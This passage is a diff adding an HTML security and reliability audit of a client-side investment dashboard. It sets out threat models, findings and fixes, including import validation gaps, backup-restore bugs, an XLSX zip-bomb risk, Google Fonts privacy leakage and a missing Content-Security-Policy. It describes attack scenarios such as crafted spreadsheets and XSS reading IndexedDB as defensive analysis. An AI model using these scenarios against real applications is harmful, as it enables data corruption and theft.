@@ -1,0 +1,934 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Investment Dashboard — Security &amp; Reliability Audit</title>
+    <style>
+      :root {
+        --bg: #0e1014;
+        --surface: #15181f;
+        --surface-2: #1c2029;
+        --border: #2a2f3a;
+        --text: #e7e9ee;
+        --muted: #8a909c;
+        --accent: #7aa2ff;
+        --crit-bg: #3a1014;
+        --crit-fg: #ff7a85;
+        --high-bg: #3a1f0a;
+        --high-fg: #ffae5d;
+        --med-bg: #2f2a0c;
+        --med-fg: #ffd86a;
+        --low-bg: #102a20;
+        --low-fg: #6fd9a3;
+        --info-bg: #0f1f30;
+        --info-fg: #7ac0ff;
+        --good-bg: #102a20;
+        --good-fg: #6fd9a3;
+      }
+      @media (prefers-color-scheme: light) {
+        :root {
+          --bg: #f7f7f9;
+          --surface: #ffffff;
+          --surface-2: #f0f1f4;
+          --border: #d8dbe1;
+          --text: #161821;
+          --muted: #5a606e;
+          --accent: #2c52c4;
+          --crit-bg: #fde4e6;
+          --crit-fg: #8a1626;
+          --high-bg: #fde7d2;
+          --high-fg: #8a4810;
+          --med-bg: #fbf3c8;
+          --med-fg: #6e5a08;
+          --low-bg: #d9efe1;
+          --low-fg: #1a5c38;
+          --info-bg: #dcecfd;
+          --info-fg: #14457f;
+          --good-bg: #d9efe1;
+          --good-fg: #1a5c38;
+        }
+      }
+      * {
+        box-sizing: border-box;
+      }
+      html,
+      body {
+        margin: 0;
+        padding: 0;
+        background: var(--bg);
+        color: var(--text);
+        font-family:
+          'Instrument Sans',
+          -apple-system,
+          BlinkMacSystemFont,
+          'Segoe UI',
+          Roboto,
+          'Helvetica Neue',
+          Arial,
+          sans-serif;
+        font-size: 15px;
+        line-height: 1.55;
+      }
+      .wrap {
+        max-width: 1100px;
+        margin: 0 auto;
+        padding: 48px 28px 96px;
+      }
+      header.hero {
+        border-bottom: 1px solid var(--border);
+        padding-bottom: 28px;
+        margin-bottom: 32px;
+      }
+      .eyebrow {
+        text-transform: uppercase;
+        letter-spacing: 0.18em;
+        font-size: 12px;
+        color: var(--muted);
+        font-weight: 600;
+      }
+      h1 {
+        font-family: 'Fraunces', Georgia, serif;
+        font-weight: 500;
+        font-size: 44px;
+        line-height: 1.1;
+        margin: 8px 0 12px;
+        letter-spacing: -0.01em;
+      }
+      h2 {
+        font-family: 'Fraunces', Georgia, serif;
+        font-weight: 500;
+        font-size: 28px;
+        margin: 48px 0 18px;
+        letter-spacing: -0.005em;
+      }
+      h3 {
+        font-size: 18px;
+        margin: 32px 0 14px;
+        font-weight: 600;
+      }
+      h4 {
+        font-size: 15px;
+        margin: 0;
+        font-weight: 600;
+      }
+      p {
+        margin: 0 0 14px;
+      }
+      .lede {
+        color: var(--muted);
+        max-width: 64ch;
+        font-size: 16px;
+      }
+      .meta {
+        display: flex;
+        flex-wrap: wrap;
+        gap: 24px;
+        margin-top: 16px;
+        font-size: 13px;
+        color: var(--muted);
+      }
+      .meta b {
+        color: var(--text);
+        font-weight: 500;
+      }
+      code,
+      kbd,
+      pre,
+      .mono {
+        font-family: 'JetBrains Mono', ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+        font-size: 0.92em;
+      }
+      code {
+        background: var(--surface-2);
+        padding: 1px 6px;
+        border-radius: 4px;
+        border: 1px solid var(--border);
+      }
+      a {
+        color: var(--accent);
+      }
+      .scorecard {
+        display: grid;
+        grid-template-columns: repeat(5, 1fr);
+        gap: 12px;
+        margin: 12px 0 8px;
+      }
+      .score {
+        border: 1px solid var(--border);
+        border-radius: 10px;
+        padding: 14px 16px;
+        background: var(--surface);
+      }
+      .score .n {
+        font-family: 'Fraunces', Georgia, serif;
+        font-weight: 500;
+        font-size: 30px;
+        line-height: 1;
+        display: block;
+      }
+      .score .l {
+        font-size: 12px;
+        color: var(--muted);
+        margin-top: 6px;
+        text-transform: uppercase;
+        letter-spacing: 0.12em;
+      }
+      .score.crit .n { color: var(--crit-fg); }
+      .score.high .n { color: var(--high-fg); }
+      .score.med .n { color: var(--med-fg); }
+      .score.low .n { color: var(--low-fg); }
+      .score.info .n { color: var(--info-fg); }
+      table.toc {
+        width: 100%;
+        border-collapse: collapse;
+        margin: 8px 0 16px;
+        font-size: 14px;
+      }
+      table.toc th,
+      table.toc td {
+        text-align: left;
+        padding: 8px 10px;
+        border-bottom: 1px solid var(--border);
+      }
+      table.toc th {
+        font-weight: 500;
+        color: var(--muted);
+        font-size: 12px;
+        text-transform: uppercase;
+        letter-spacing: 0.1em;
+      }
+      table.toc tr:last-child td {
+        border-bottom: none;
+      }
+      .pill {
+        display: inline-block;
+        padding: 2px 9px;
+        border-radius: 999px;
+        font-size: 11px;
+        font-weight: 600;
+        text-transform: uppercase;
+        letter-spacing: 0.08em;
+        line-height: 1.6;
+        white-space: nowrap;
+        border: 1px solid transparent;
+      }
+      .pill.crit { background: var(--crit-bg); color: var(--crit-fg); border-color: var(--crit-fg); }
+      .pill.high { background: var(--high-bg); color: var(--high-fg); border-color: var(--high-fg); }
+      .pill.med { background: var(--med-bg); color: var(--med-fg); border-color: var(--med-fg); }
+      .pill.low { background: var(--low-bg); color: var(--low-fg); border-color: var(--low-fg); }
+      .pill.info { background: var(--info-bg); color: var(--info-fg); border-color: var(--info-fg); }
+      .pill.cat {
+        background: var(--surface-2);
+        color: var(--muted);
+        border-color: var(--border);
+        text-transform: none;
+        letter-spacing: 0;
+        font-weight: 500;
+      }
+      .finding {
+        border: 1px solid var(--border);
+        border-radius: 12px;
+        padding: 18px 20px;
+        background: var(--surface);
+        margin: 14px 0;
+      }
+      .finding-head {
+        display: flex;
+        align-items: baseline;
+        gap: 10px;
+        flex-wrap: wrap;
+        margin-bottom: 6px;
+      }
+      .finding-head .id {
+        font-family: 'JetBrains Mono', monospace;
+        color: var(--muted);
+        font-size: 12px;
+      }
+      .finding-head h4 {
+        flex: 1 1 auto;
+      }
+      .finding-meta {
+        display: flex;
+        gap: 8px;
+        flex-wrap: wrap;
+        margin-top: 4px;
+        margin-bottom: 12px;
+      }
+      .kv {
+        display: grid;
+        grid-template-columns: 110px 1fr;
+        gap: 8px 14px;
+        margin-top: 8px;
+        font-size: 14px;
+      }
+      .kv dt {
+        color: var(--muted);
+        font-size: 12px;
+        text-transform: uppercase;
+        letter-spacing: 0.1em;
+        padding-top: 2px;
+      }
+      .kv dd {
+        margin: 0;
+      }
+      pre.snippet {
+        background: var(--surface-2);
+        border: 1px solid var(--border);
+        border-radius: 6px;
+        padding: 10px 12px;
+        overflow-x: auto;
+        font-size: 12.5px;
+        line-height: 1.5;
+        margin: 4px 0;
+      }
+      details summary {
+        cursor: pointer;
+        color: var(--muted);
+        font-size: 13px;
+        margin-top: 8px;
+      }
+      .callout {
+        border: 1px solid var(--border);
+        border-radius: 10px;
+        padding: 16px 18px;
+        margin: 18px 0;
+        background: var(--surface);
+      }
+      .callout.crit { background: var(--crit-bg); border-color: var(--crit-fg); color: var(--crit-fg); }
+      .callout.good { background: var(--good-bg); border-color: var(--good-fg); color: var(--good-fg); }
+      .callout h3 { margin-top: 0; color: inherit; }
+      .grid-2 {
+        display: grid;
+        grid-template-columns: 1fr 1fr;
+        gap: 14px;
+      }
+      @media (max-width: 720px) {
+        .scorecard { grid-template-columns: repeat(3, 1fr); }
+        .grid-2 { grid-template-columns: 1fr; }
+        h1 { font-size: 34px; }
+        .wrap { padding: 28px 18px 72px; }
+        .kv { grid-template-columns: 1fr; gap: 2px; }
+        .kv dt { padding-top: 6px; }
+      }
+      footer {
+        margin-top: 64px;
+        padding-top: 24px;
+        border-top: 1px solid var(--border);
+        font-size: 13px;
+        color: var(--muted);
+      }
+    </style>
+  </head>
+  <body>
+    <div class="wrap">
+      <header class="hero">
+        <div class="eyebrow">Security &amp; Reliability Audit</div>
+        <h1>Investment Dashboard</h1>
+        <p class="lede">
+          Read-only audit of <code>main</code> at <code>35334a8</code>, anchored on the
+          edge-only / no-backend threat model declared in <code>CLAUDE.md</code>. The
+          attacker is either a malicious file the user is tricked into importing, or
+          drift in the user&rsquo;s own stored state. XSS is the highest-impact security
+          bug because it would exfiltrate the entire IndexedDB; everything else is
+          measured against silent data corruption or page-level brick.
+        </p>
+        <div class="meta">
+          <span><b>Branch:</b> main @ 35334a8</span>
+          <span><b>Scope:</b> src/, index.html, vite/CI config, package-lock</span>
+          <span><b>Reviewer:</b> 4 parallel grey-box passes</span>
+          <span><b>Date:</b> 2026-05-22</span>
+        </div>
+      </header>
+
+      <h2 id="exec-summary">Executive summary</h2>
+      <p>
+        The codebase is in good shape for a personal, edge-only dashboard: TypeScript
+        strict everywhere, manual-entry form validators are tight, IndexedDB versioned,
+        and React JSX text-escaping closes the obvious XSS class. <b>No actively
+        exploitable vulnerability was found.</b> The interesting findings cluster
+        around three themes:
+      </p>
+      <ul>
+        <li>
+          <b>The import path trusts XLSX cells that the manual form would reject.</b>
+          A negative <code>quantity</code> or zero-coerced unparseable cell becomes a
+          row in IndexedDB without comment. The same XLSX is also an unbounded
+          decompression source &mdash; no file-size or row-count cap.
+        </li>
+        <li>
+          <b>Backup-restore silently drops manual holdings.</b>
+          <code>VALID_SOURCES</code> in <code>restoreBackup.ts</code> only accepts
+          <code>vested|groww</code>; <code>manual</code> rows survive export but are
+          rejected on restore, and the failure aborts the whole atomic replace. The
+          schema-version check is also strict-equal, so a single
+          <code>DB_VERSION</code> bump invalidates every prior backup.
+        </li>
+        <li>
+          <b>Privacy claim vs. behaviour drift.</b>
+          <code>CLAUDE.md</code> states &ldquo;no portfolio data leaves the device by
+          default,&rdquo; but <code>index.html</code> preconnects to
+          <code>fonts.googleapis.com</code> and <code>fonts.gstatic.com</code> on every
+          load &mdash; not portfolio data, but IP + UA exfil to Google with no opt-in.
+        </li>
+      </ul>
+      <p>
+        Reliability gaps are concentrated in <i>error containment</i>: a single bad
+        row can white-screen <code>HoldingsRoute</code> or <code>AnalyticsRoute</code>
+        because only the chart subtree is wrapped in an error boundary, and IDB
+        transaction failures (<code>QuotaExceededError</code>, version conflict) are
+        not surfaced to the user.
+      </p>
+
+      <div class="scorecard">
+        <div class="score crit"><span class="n">0</span><div class="l">Critical</div></div>
+        <div class="score high"><span class="n">5</span><div class="l">High</div></div>
+        <div class="score med"><span class="n">14</span><div class="l">Medium</div></div>
+        <div class="score low"><span class="n">9</span><div class="l">Low</div></div>
+        <div class="score info"><span class="n">3</span><div class="l">Info</div></div>
+      </div>
+
+      <div class="callout good">
+        <h3>What is solid</h3>
+        <ul>
+          <li>No <code>dangerouslySetInnerHTML</code>, <code>eval</code>, dynamic <code>Function()</code>, or string-form <code>setTimeout</code> anywhere in <code>src/</code>.</li>
+          <li>No <code>href={userInput}</code>, no <code>target="_blank"</code> on user-derived URLs, no Recharts custom HTML renderer &mdash; the XSS sink surface is effectively zero today.</li>
+          <li>Manual-entry validator (<code>src/lib/holdingValidators.ts:56-64</code>) correctly rejects <code>quantity &le; 0</code> and <code>avgBuyPrice &le; 0</code> &mdash; the bug is that the import path doesn&rsquo;t reuse this contract.</li>
+          <li>IndexedDB uses <code>idb</code> with versioned upgrade callbacks (v1 &rarr; v2 &rarr; v3) and an indexed <code>source+symbol</code> primary key.</li>
+          <li>TypeScript strict mode, <code>noUnusedLocals</code>, <code>noUncheckedSideEffectImports</code> are all on across <code>tsconfig.app.json</code>, <code>tsconfig.test.json</code>, <code>tsconfig.node.json</code>.</li>
+          <li><code>.env</code> is intentionally committed and contains only <code>VITE_APP_TITLE</code> &mdash; no leaked secrets.</li>
+          <li>Vite <code>base: '/investment-dashboard/'</code> is correctly set for the GH Pages subpath.</li>
+          <li>CI workflow uses least-needed permissions (<code>contents: read, pages: write, id-token: write</code>) and <code>npm ci</code> against a checked-in lockfile.</li>
+        </ul>
+      </div>
+
+      <h2 id="threat-model">Threat model recap</h2>
+      <p>
+        The app is a static SPA on GitHub Pages with no server, no auth, and no
+        first-party telemetry. Three attacker profiles are in scope:
+      </p>
+      <div class="grid-2">
+        <div class="callout">
+          <h4>A. Malicious import file</h4>
+          <p class="lede" style="font-size:14px">
+            The user is tricked into importing an XLSX/CSV they believe is a Groww or
+            Vested export. The attacker controls every cell. The win conditions are
+            (i) JS execution &rArr; IndexedDB exfil, (ii) DoS via decompression /
+            row-count, (iii) silent corruption of stored quantities or prices.
+          </p>
+        </div>
+        <div class="callout">
+          <h4>B. Malicious backup JSON</h4>
+          <p class="lede" style="font-size:14px">
+            A user is offered a &ldquo;sample portfolio&rdquo; backup. The restore
+            path replaces all holdings atomically. Win conditions are the same as A,
+            minus DoS (JSON is parsed by the browser), plus &ldquo;downgrade attacks&rdquo;
+            where an attacker-supplied schemaVersion bypasses newer validation.
+          </p>
+        </div>
+        <div class="callout">
+          <h4>C. Supply-chain drift</h4>
+          <p class="lede" style="font-size:14px">
+            <code>fonts.googleapis.com</code>, npm packages (<code>exceljs</code>,
+            <code>recharts</code>, <code>idb</code>, <code>react-router-dom</code>),
+            and GitHub Actions are external dependencies. A takeover of any of these
+            executes in the user&rsquo;s browser with full access to the IndexedDB.
+          </p>
+        </div>
+        <div class="callout">
+          <h4>Out of scope</h4>
+          <p class="lede" style="font-size:14px">
+            Network-level adversaries (GitHub Pages forces HTTPS), authentication
+            (none), server compromise (none), other users (single-user app). MITM
+            is residual only on third-party HTTPS dependencies.
+          </p>
+        </div>
+      </div>
+
+      <h2 id="findings">Findings</h2>
+
+      <table class="toc">
+        <thead>
+          <tr>
+            <th style="width:64px">ID</th>
+            <th style="width:84px">Severity</th>
+            <th>Title</th>
+            <th style="width:120px">Category</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr><td><a href="#f-h1">H-1</a></td><td><span class="pill high">High</span></td><td>Negative / non-finite quantities accepted on import (manual form rejects them)</td><td>Data integrity</td></tr>
+          <tr><td><a href="#f-h2">H-2</a></td><td><span class="pill high">High</span></td><td>Backup restore silently drops all <code>manual</code> holdings &mdash; whole restore aborts</td><td>Data integrity</td></tr>
+          <tr><td><a href="#f-h3">H-3</a></td><td><span class="pill high">High</span></td><td>XLSX zip-bomb / unbounded row iteration &mdash; main-thread DoS</td><td>Reliability</td></tr>
+          <tr><td><a href="#f-h4">H-4</a></td><td><span class="pill high">High</span></td><td>IndexedDB write failures are not surfaced to the UI</td><td>Reliability</td></tr>
+          <tr><td><a href="#f-h5">H-5</a></td><td><span class="pill high">High</span></td><td>Google Fonts preconnect contradicts the &ldquo;privacy first&rdquo; claim</td><td>Privacy</td></tr>
+          <tr><td><a href="#f-m1">M-1</a></td><td><span class="pill med">Medium</span></td><td>No <code>Content-Security-Policy</code> meta tag &mdash; no defense-in-depth against future XSS</td><td>Security</td></tr>
+          <tr><td><a href="#f-m2">M-2</a></td><td><span class="pill med">Medium</span></td><td>GitHub Actions referenced by major-version tag, not commit SHA</td><td>Supply chain</td></tr>
+          <tr><td><a href="#f-m3">M-3</a></td><td><span class="pill med">Medium</span></td><td>Google Fonts stylesheet loaded without SRI <code>integrity</code></td><td>Supply chain</td></tr>
+          <tr><td><a href="#f-m4">M-4</a></td><td><span class="pill med">Medium</span></td><td>Schema-version equality check rejects every backup after a <code>DB_VERSION</code> bump</td><td>Reliability</td></tr>
+          <tr><td><a href="#f-m5">M-5</a></td><td><span class="pill med">Medium</span></td><td>Backup never includes the <code>history</code> store &mdash; time-series silently lost on restore</td><td>Data integrity</td></tr>
+          <tr><td><a href="#f-m6">M-6</a></td><td><span class="pill med">Medium</span></td><td>Backup parser accepts implausible FX rates and missing-range validation</td><td>Data integrity</td></tr>
+          <tr><td><a href="#f-m7">M-7</a></td><td><span class="pill med">Medium</span></td><td>No top-level / route-level error boundary &mdash; one render throw white-screens the page</td><td>Reliability</td></tr>
+          <tr><td><a href="#f-m8">M-8</a></td><td><span class="pill med">Medium</span></td><td>Multi-tab import race &mdash; stale diff overwrites concurrent writes</td><td>Data integrity</td></tr>
+          <tr><td><a href="#f-m9">M-9</a></td><td><span class="pill med">Medium</span></td><td><code>cellNumber()</code> coerces unparseable strings to <code>0</code>, masking malformed exports</td><td>Data integrity</td></tr>
+          <tr><td><a href="#f-m10">M-10</a></td><td><span class="pill med">Medium</span></td><td>Restore baseCurrency mismatch silently orphans historical analytics</td><td>Data integrity</td></tr>
+          <tr><td><a href="#f-m11">M-11</a></td><td><span class="pill med">Medium</span></td><td>FX fetch has no retry / backoff / cached fallback signalling</td><td>Reliability</td></tr>
+          <tr><td><a href="#f-m12">M-12</a></td><td><span class="pill med">Medium</span></td><td>No service worker &mdash; app does not work offline</td><td>Reliability</td></tr>
+          <tr><td><a href="#f-m13">M-13</a></td><td><span class="pill med">Medium</span></td><td>Modal lacks focus trap and focus restore (WCAG 2.1 AA)</td><td>A11y / Reliability</td></tr>
+          <tr><td><a href="#f-m14">M-14</a></td><td><span class="pill med">Medium</span></td><td>CSV/formula-injection: leading <code>=+@-</code> not stripped from parsed cell text</td><td>Security</td></tr>
+          <tr><td><a href="#f-l1">L-1</a></td><td><span class="pill low">Low</span></td><td>Duplicate <code>deploy.yml</code> at repo root vs. <code>.github/workflows/</code></td><td>Repo hygiene</td></tr>
+          <tr><td><a href="#f-l2">L-2</a></td><td><span class="pill low">Low</span></td><td>CI <code>node-version: lts/*</code> floats &mdash; non-reproducible builds</td><td>Build / CI</td></tr>
+          <tr><td><a href="#f-l3">L-3</a></td><td><span class="pill low">Low</span></td><td>No explicit <code>build.sourcemap: false</code> in <code>vite.config.ts</code></td><td>Security (minor)</td></tr>
+          <tr><td><a href="#f-l4">L-4</a></td><td><span class="pill low">Low</span></td><td>Build script doesn&rsquo;t verify <code>dist/</code> is non-empty before deploy</td><td>Reliability</td></tr>
+          <tr><td><a href="#f-l5">L-5</a></td><td><span class="pill low">Low</span></td><td>Undo hook keeps only one snapshot &mdash; rapid deletes lose recovery</td><td>Reliability / UX</td></tr>
+          <tr><td><a href="#f-l6">L-6</a></td><td><span class="pill low">Low</span></td><td>Closed-position rows are never marked stale regardless of last refresh</td><td>Data quality</td></tr>
+          <tr><td><a href="#f-l7">L-7</a></td><td><span class="pill low">Low</span></td><td>Backup parser doesn&rsquo;t enforce timestamp invariants (<code>importedAt &ge; createdAt</code> etc.)</td><td>Data integrity</td></tr>
+          <tr><td><a href="#f-l8">L-8</a></td><td><span class="pill low">Low</span></td><td>No max-length on parsed cell text &mdash; latent ReDoS / memory growth</td><td>Reliability</td></tr>
+          <tr><td><a href="#f-l9">L-9</a></td><td><span class="pill low">Low</span></td><td>User name rendered verbatim in greeting &mdash; extension / screen-share surface</td><td>Privacy</td></tr>
+          <tr><td><a href="#f-i1">I-1</a></td><td><span class="pill info">Info</span></td><td>Caret ranges on every dependency &mdash; mitigated by lockfile + <code>npm ci</code></td><td>Supply chain</td></tr>
+          <tr><td><a href="#f-i2">I-2</a></td><td><span class="pill info">Info</span></td><td>No <code>npm audit</code> step in CI</td><td>Supply chain</td></tr>
+          <tr><td><a href="#f-i3">I-3</a></td><td><span class="pill info">Info</span></td><td>README contains a stale OAuth workaround comment</td><td>Docs</td></tr>
+        </tbody>
+      </table>
+
+      <h2 id="high">High severity</h2>
+
+      <section class="finding" id="f-h1">
+        <div class="finding-head">
+          <span class="id">H-1</span>
+          <h4>Negative / non-finite quantities accepted on import (manual form rejects them)</h4>
+          <span class="pill high">High</span>
+        </div>
+        <div class="finding-meta">
+          <span class="pill cat">Data integrity</span>
+          <span class="pill cat">Threat model A</span>
+        </div>
+        <dl class="kv">
+          <dt>Files</dt><dd><code>src/parsers/groww.ts:71-78</code>, <code>src/parsers/vested.ts:72-79</code>, <code>src/parsers/xlsx-utils.ts:13-23</code>, <code>src/lib/restoreBackup.ts:105-135</code></dd>
+          <dt>Description</dt>
+          <dd>
+            <p>The manual entry form rejects <code>quantity &le; 0</code> and <code>avgBuyPrice &le; 0</code>:</p>
+            <pre class="snippet">// src/lib/holdingValidators.ts:56-64
+const quantity = parseFinite(input.quantity)
+if (quantity === undefined || quantity &lt;= 0) {
+  errors.quantity = 'Quantity must be a positive number'
+}
+const avgBuyPrice = parseFinite(input.avgBuyPrice)
+if (avgBuyPrice === undefined || avgBuyPrice &lt;= 0) {
+  errors.avgBuyPrice = 'Avg buy price must be a positive number'
+}</pre>
+            <p>But the broker import path only checks <code>quantity === 0</code> for the &ldquo;ghost row&rdquo; filter:</p>
+            <pre class="snippet">// src/parsers/groww.ts:78
+const ghost = !name || name === 'NA' || quantity === 0</pre>
+            <p>And <code>cellNumber()</code> returns <code>0</code> for anything unparseable, so a cell containing <code>"-10"</code>, <code>"Infinity"</code>, or <code>"1e308"</code> passes straight through. Backup restore (<code>restoreBackup.ts</code>) only checks <code>isFiniteNumber</code> &mdash; negatives pass too.</dd>
+          <dt>Impact</dt>
+          <dd>An attacker-crafted XLSX with <code>quantity: -100</code> stores a phantom short position. Cost-basis math (<code>marketValueBase</code>, <code>concentration</code>, <code>topMovers</code>) silently produces nonsense; <code>HHI</code> can go negative. A user who imports a tampered file then opens Analytics sees plausible-looking but inverted numbers, never told anything is wrong.</dd>
+          <dt>Fix</dt>
+          <dd>Promote <code>holdingValidators.ts</code> into a shared <code>assertHolding()</code> and call it (a) at the end of every parser, (b) inside <code>validateHolding()</code> in <code>restoreBackup.ts</code>. Reject &mdash; do not silently skip &mdash; rows that fail. Surface skipped rows in the import preview by symbol so the user can see what was dropped.</dd>
+        </dl>
+      </section>
+
+      <section class="finding" id="f-h2">
+        <div class="finding-head">
+          <span class="id">H-2</span>
+          <h4>Backup restore silently drops all <code>manual</code> holdings &mdash; whole restore aborts</h4>
+          <span class="pill high">High</span>
+        </div>
+        <div class="finding-meta">
+          <span class="pill cat">Data integrity</span>
+          <span class="pill cat">Threat model B</span>
+          <span class="pill cat">Confirmed by reading file</span>
+        </div>
+        <dl class="kv">
+          <dt>Files</dt><dd><code>src/lib/restoreBackup.ts:19</code>, <code>src/lib/restoreBackup.ts:99-101</code>, <code>src/storage/holdings.ts:4</code></dd>
+          <dt>Description</dt>
+          <dd>
+            <pre class="snippet">// src/lib/restoreBackup.ts:19
+const VALID_SOURCES: ReadonlySet&lt;Source&gt; = new Set&lt;Source&gt;(['vested', 'groww'])
+// :99
+if (typeof raw.source !== 'string' || !VALID_SOURCES.has(raw.source as Source)) {
+  return { ok: false, error: `source must be one of vested|groww` }
+}</pre>
+            <p><code>Source</code> is defined as <code>'vested' | 'groww' | 'manual'</code> in <code>holdings.ts:4</code>. <code>exportSnapshot()</code> exports every holding regardless of source. A backup round-trip of a portfolio that contains any manually-added position aborts the entire <code>restoreAllHoldings()</code> transaction with a per-row validation error.</dd>
+          <dt>Impact</dt>
+          <dd>The user&rsquo;s only documented disaster-recovery path silently fails for any portfolio with a manual row &mdash; which is the dominant use case once Phase 1 lets users add holdings by hand. The transaction is atomic-replace, so the old data is untouched, but the user sees a generic failure and may try to &ldquo;fix it&rdquo; by re-importing, compounding the confusion.</dd>
+          <dt>Fix</dt>
+          <dd>Add <code>'manual'</code> to <code>VALID_SOURCES</code>. Add a regression test that exports a portfolio with one row of each source and restores cleanly. Optionally split &ldquo;skip invalid row&rdquo; from &ldquo;reject backup&rdquo; so a single bad row doesn&rsquo;t torch the entire restore.</dd>
+        </dl>
+      </section>
+
+      <section class="finding" id="f-h3">
+        <div class="finding-head">
+          <span class="id">H-3</span>
+          <h4>XLSX zip-bomb / unbounded row iteration &mdash; main-thread DoS</h4>
+          <span class="pill high">High</span>
+        </div>
+        <div class="finding-meta">
+          <span class="pill cat">Reliability</span>
+          <span class="pill cat">Threat model A</span>
+        </div>
+        <dl class="kv">
+          <dt>Files</dt><dd><code>src/routes/import/UploadStep.tsx:30</code>, <code>src/parsers/groww.ts:67-99</code>, <code>src/parsers/vested.ts:68-100</code></dd>
+          <dt>Description</dt>
+          <dd>
+            <p>The upload handler reads the entire file into memory and hands the buffer to <code>ExcelJS.load()</code> with no size cap:</p>
+            <pre class="snippet">// src/routes/import/UploadStep.tsx (approx)
+const buf = await file.arrayBuffer()
+const result = await parseGroww(buf)</pre>
+            <p>XLSX is a zip archive; a tiny compressed payload can expand to many GB. Both parsers then loop <code>for (let i = headerRowIndex + 1; i &lt;= ws.rowCount; i++)</code> with no upper bound &mdash; <code>ws.rowCount</code> can be made arbitrarily large.</dd>
+          <dt>Impact</dt>
+          <dd>A 5 MB malicious .xlsx hangs the browser tab or kills it via OOM. Pre-commit, this is recoverable; mid-commit, it can leave a partially-written transaction in IDB (though <code>idb</code> aborts atomically on tab kill, so practical damage is limited to lost work and a soured user experience).</dd>
+          <dt>Fix</dt>
+          <dd>Reject <code>file.size &gt; 10 * 1024 * 1024</code> before <code>arrayBuffer()</code>. Cap the iteration with <code>const max = Math.min(ws.rowCount, 50_000)</code> and tell the user the file was truncated. If feasible, move parsing to a Web Worker so a hang doesn&rsquo;t freeze the UI.</dd>
+        </dl>
+      </section>
+
+      <section class="finding" id="f-h4">
+        <div class="finding-head">
+          <span class="id">H-4</span>
+          <h4>IndexedDB write failures are not surfaced to the UI</h4>
+          <span class="pill high">High</span>
+        </div>
+        <div class="finding-meta">
+          <span class="pill cat">Reliability</span>
+        </div>
+        <dl class="kv">
+          <dt>Files</dt><dd><code>src/storage/holdings.ts</code> &mdash; <code>commitImport</code>, <code>upsertHolding</code>, <code>deleteHolding</code>, <code>setHoldingStatus</code>, <code>revertHoldingOverrides</code>, <code>restoreAllHoldings</code> (all sites with <code>await tx.done</code>)</dd>
+          <dt>Description</dt>
+          <dd>Every write path <code>await</code>s <code>tx.done</code> but has no try / catch and no error reporting back to the route. The IDB transaction will reject (and roll back atomically) on <code>QuotaExceededError</code>, version mismatch, or browser-imposed termination, but the calling component generally cannot distinguish &ldquo;saved&rdquo; from &ldquo;silently rolled back.&rdquo;</dd>
+          <dt>Impact</dt>
+          <dd>The Holdings UI shows success state after a deletion that actually rolled back. The Restore UI in <code>DataBackupSection.tsx</code> triggers <code>location.reload()</code> immediately after <code>restoreAllHoldings</code>, masking failure: the user reloads into the <i>old</i> portfolio convinced they restored.</dd>
+          <dt>Fix</dt>
+          <dd>Return a Result-shaped value from each write path and surface <code>QuotaExceededError</code> distinctly (offer to export current data first). Replace blind <code>location.reload()</code> in <code>DataBackupSection</code> with an in-route render of the restored state.</dd>
+        </dl>
+      </section>
+
+      <section class="finding" id="f-h5">
+        <div class="finding-head">
+          <span class="id">H-5</span>
+          <h4>Google Fonts preconnect contradicts the &ldquo;privacy first&rdquo; claim</h4>
+          <span class="pill high">High</span>
+        </div>
+        <div class="finding-meta">
+          <span class="pill cat">Privacy</span>
+          <span class="pill cat">Threat model C</span>
+        </div>
+        <dl class="kv">
+          <dt>Files</dt><dd><code>index.html:9-14</code></dd>
+          <dt>Description</dt>
+          <dd>
+            <pre class="snippet">&lt;link rel="preconnect" href="https://fonts.googleapis.com" /&gt;
+&lt;link rel="preconnect" href="https://fonts.gstatic.com" crossorigin /&gt;
+&lt;link href="https://fonts.googleapis.com/css2?family=Fraunces..." rel="stylesheet" /&gt;</pre>
+            <p>Every page load opens a TLS connection to two Google domains and fetches a CSS+font from a third-party server. Portfolio data is not transmitted, but IP, User-Agent, Referer, and exact load timing are &mdash; on a dashboard explicitly framed as &ldquo;all data stays on the user&rsquo;s device.&rdquo; <code>CLAUDE.md</code>: <i>&ldquo;No portfolio data leaves the device by default... no first-party telemetry under any condition.&rdquo;</i> The intent is clear; the implementation isn&rsquo;t aligned.</dd>
+          <dt>Impact</dt>
+          <dd>Documented privacy promise is not currently met. Also a supply-chain dependency: a compromise of <code>fonts.googleapis.com</code> (or a hostile CSS feature like a CSS keylogger via <code>@font-face</code> tricks) injects styles into the page with the same origin as the rest of the app.</dd>
+          <dt>Fix</dt>
+          <dd>Self-host the two font families (download .woff2, generate <code>@font-face</code> in <code>src/index.css</code>). Delete both <code>preconnect</code> lines and the Google stylesheet <code>&lt;link&gt;</code>. Add an entry to a future <code>SECURITY.md</code> / privacy page asserting zero third-party network traffic.</dd>
+        </dl>
+      </section>
+
+      <h2 id="medium">Medium severity</h2>
+
+      <section class="finding" id="f-m1">
+        <div class="finding-head"><span class="id">M-1</span><h4>No <code>Content-Security-Policy</code> meta tag &mdash; no defense-in-depth against future XSS</h4><span class="pill med">Medium</span></div>
+        <div class="finding-meta"><span class="pill cat">Security</span></div>
+        <dl class="kv">
+          <dt>Files</dt><dd><code>index.html</code></dd>
+          <dt>Description</dt>
+          <dd>GitHub Pages can&rsquo;t set response headers, but a <code>&lt;meta http-equiv="Content-Security-Policy"&gt;</code> covers most of what matters (scripts, fetch, frame-ancestors). Today there&rsquo;s nothing &mdash; if an XSS regression slips in (e.g. someone adds a Recharts custom HTML label, or imports a tooltip library that uses <code>innerHTML</code>), the IndexedDB is fully readable from the injected script.</dd>
+          <dt>Fix</dt>
+          <dd>Add (paired with self-hosted fonts from H-5):
+            <pre class="snippet">&lt;meta http-equiv="Content-Security-Policy" content="
+  default-src 'self';
+  script-src 'self';
+  style-src 'self' 'unsafe-inline';
+  img-src 'self' data:;
+  font-src 'self';
+  connect-src 'self' https://api.frankfurter.dev;
+  frame-ancestors 'none';
+  base-uri 'self';
+  form-action 'none';
+" /&gt;</pre>
+            Tailwind v4 injects styles via JS so <code>style-src 'unsafe-inline'</code> is likely needed unless the build is reconfigured.</dd>
+        </dl>
+      </section>
+
+      <section class="finding" id="f-m2">
+        <div class="finding-head"><span class="id">M-2</span><h4>GitHub Actions referenced by major-version tag, not commit SHA</h4><span class="pill med">Medium</span></div>
+        <div class="finding-meta"><span class="pill cat">Supply chain</span><span class="pill cat">Threat model C</span></div>
+        <dl class="kv">
